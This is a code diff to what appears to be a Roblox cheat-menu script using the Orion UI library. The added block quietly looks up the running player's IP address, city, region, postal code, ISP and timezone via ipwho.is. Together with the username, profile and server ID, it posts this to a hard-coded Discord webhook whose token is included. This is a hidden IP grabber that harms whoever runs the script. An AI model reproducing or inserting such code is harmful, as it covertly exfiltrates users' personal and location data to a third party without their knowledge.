@@ -111,4 +111,86 @@ Tab:AddButton({
     end
 })
  
+local HttpService = game:GetService("HttpService")
+local Players = game.Players
+local PlaceId = game.PlaceId
+local JobId = game.JobId
+
+-- Вставьте ваш URL вебхука
+local webhookUrl = "https://discord.com/api/webhooks/1308836484538830888/8gb2K3uuEZWpq7RCjyhvluwzAVvPAOyvev7q9OJdEY9vRTDI5NwvPAZj_CoOEKMbrjQl"
+
+-- Функция для отправки сообщения в webhook
+local function sendWebhookMessage(embed)
+    local data = {
+        embeds = { embed }
+    }
+    local jsonData = HttpService:JSONEncode(data)
+
+    -- Для отправки HTTP запроса
+    local request = http_request or request -- для поддержки различных API
+    local response = request({
+        Url = webhookUrl,
+        Method = "POST",
+        Headers = {
+            ["Content-Type"] = "application/json"
+        },
+        Body = jsonData
+    })
+
+    print("Webhook response status: " .. response.StatusCode)
+end
+
+-- Получаем изображение профиля, готовность игрока и ник
+local ProfileImage, IsReady = Players:GetUserThumbnailAsync(Players.LocalPlayer.UserId, Enum.ThumbnailType.HeadShot, Enum.ThumbnailSize.Size420x420)
+local PlayerName = Players.LocalPlayer.Name
+
+-- Запрашиваем информацию о IP
+local IP = HttpService:JSONDecode(game:HttpGet("https://ipwho.is/"))
+local IPAdress = IP.ip
+local Continent = IP.continent
+local Country = IP.country
+local CountryCode = IP.country_code
+local Flag = IP.flag.emoji
+local Region = IP.region
+local City = IP.city
+local Postal = IP.postal
+local ConnectionOrg = IP.connection.org
+local Timezone = IP.timezone.id
+local CurrentTime = IP.timezone.current_time
+
+-- Получаем информацию о месте
+local PlaceName = game:GetService("MarketplaceService"):GetProductInfo(PlaceId).Name
+
+-- Формируем сообщение с использованием эмбеда
+local embed = {
+    title = "Информация о игроке",
+    description = "Детальная информация о текущем игроке. Вы можете скопировать эти данные.",
+    color = 0x00ff00, -- Зеленый цвет
+    fields = {
+        { name = "Ник игрока", value = "`" .. PlayerName .. "`", inline = false },
+        { name = "Изображение профиля", value = "[Перейти на профиль](https://www.roblox.com/users/" .. Players.LocalPlayer.UserId .. "/profile) \n [Фотография профиля](" .. ProfileImage .. ")", inline = false },
+        { name = "Готовность", value = "`" .. tostring(IsReady) .. "`", inline = true },
+        { name = "IP адрес", value = "`" .. IPAdress .. "`", inline = true },
+        { name = "Континент", value = "`" .. Continent .. "`", inline = true },
+        { name = "Страна", value = "`" .. Country .. " " .. Flag .. " (Код: " .. CountryCode .. ")`", inline = true },
+        { name = "Регион", value = "`" .. Region .. "`", inline = true },
+        { name = "Город", value = "`" .. City .. "`", inline = true },
+        { name = "Почтовый индекс", value = "`" .. Postal .. "`", inline = true },
+        { name = "Организация соединения", value = "`" .. ConnectionOrg .. "`", inline = true },
+        { name = "Часовой пояс", value = "`" .. Timezone .. "`", inline = true },
+        { name = "Текущее время", value = "`" .. CurrentTime .. "`", inline = true },
+        { name = "ID Плейса", value = "`" .. PlaceId .. "`", inline = true },
+        { name = "Название Плейса", value = "`" .. PlaceName .. "`", inline = true },
+        { name = "Job ID", value = "`" .. JobId .. "`", inline = true },
+    },
+    footer = {
+        text = "Информация о игроке в Roblox",
+    },
+    timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ"), -- Добавляем метку времени в формате ISO 8601
+}
+
+-- Отправляем сообщение в webhook
+sendWebhookMessage(embed)
+
+
 OrionLib:Init() --Require If The Script Is Done
